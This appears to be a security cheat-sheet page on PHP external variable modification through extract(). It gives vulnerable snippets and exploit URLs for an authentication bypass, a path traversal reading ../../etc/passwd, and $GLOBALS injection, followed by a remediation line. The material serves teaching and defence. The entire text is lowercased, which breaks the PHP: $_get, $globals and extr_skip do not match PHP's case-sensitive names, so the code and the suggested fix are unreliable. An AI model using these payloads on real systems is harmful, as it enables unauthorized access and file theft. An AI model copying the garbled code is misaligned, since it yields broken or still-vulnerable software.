# external variable modification

> external variable modification vulnerability occurs when a web application improperly handles user input, allowing attackers to overwrite internal variables. in php, functions like extract($_get), extract($_post), or import_request_variables() can be abused if they import user-controlled data into the global scope without proper validation. this can lead to security issues such as unauthorized changes to application logic, privilege escalation, or bypassing security controls.

## summary

* [methodology](#methodology)
    * [overwriting critical variables](#overwriting-critical-variables)
    * [poisoning file inclusion](#poisoning-file-inclusion)
    * [global variable injection](#global-variable-injection)
* [remediations](#remediations)
* [references](#references)

## methodology

the `extract()` function in php imports variables from an array into the current symbol table. while it may seem convenient, it can introduce serious security risks, especially when handling user-supplied data.

* it allows overwriting existing variables.
* it can lead to **variable pollution**, impacting security mechanisms.
* it can be used as a **gadget** to trigger other vulnerabilities like remote code execution (rce) and local file inclusion (lfi).

by default, `extract()` uses `extr_overwrite`, meaning it **replaces existing variables** if they share the same name as keys in the input array.

### overwriting critical variables

if `extract()` is used in a script that relies on specific variables, an attacker can manipulate them.

```php
<?php
    $authenticated = false;
    extract($_get);
    if ($authenticated) {
        echo "access granted!";
    } else {
        echo "access denied!";
    }
?>
```

**exploitation:**

in this example, the use of `extract($_get)` allow an attacker to set the `$authenticated` variable to `true`:

```ps1
http://example.com/vuln.php?authenticated=true
http://example.com/vuln.php?authenticated=1
```

### poisoning file inclusion

if `extract()` is combined with file inclusion, attackers can control file paths.

```php
<?php
    $page = "config.php";
    extract($_get);
    include "$page";
?>
```

**exploitation:**

```ps1
http://example.com/vuln.php?page=../../etc/passwd
```

### global variable injection

:warning: as of php 8.1.0, write access to the entire `$globals` array is no longer supported.

overwriting `$globals` when an application calls `extract` function on untrusted value:

```php
extract($_get);
```

an attacker can manipulate **global variables**:

```ps1
http://example.com/vuln.php?globals[admin]=1
```

## remediations

use `extr_skip` to prevent overwriting:

```php
extract($_get, extr_skip);
```

## references

* [cwe-473: php external variable modification - common weakness enumeration - november 19, 2024](https://cwe.mitre.org/data/definitions/473.html)
* [cwe-621: variable extraction error - common weakness enumeration - november 19, 2024](https://cwe.mitre.org/data/definitions/621.html)
* [function extract - php documentation - march 21, 2001](https://www.php.net/manual/en/function.extract.php)
* [$globals variables - php documentation - april 30, 2008](https://www.php.net/manual/en/reserved.variables.globals.php)
* [the ducks - hackthissite - december 14, 2016](https://github.com/hackthissite/ctf-writeups/blob/master/2016/sctf/ducks/readme.md)
* [extracttheflag! - orel / windteam - february 28, 2024](https://ctftime.org/writeup/38076)
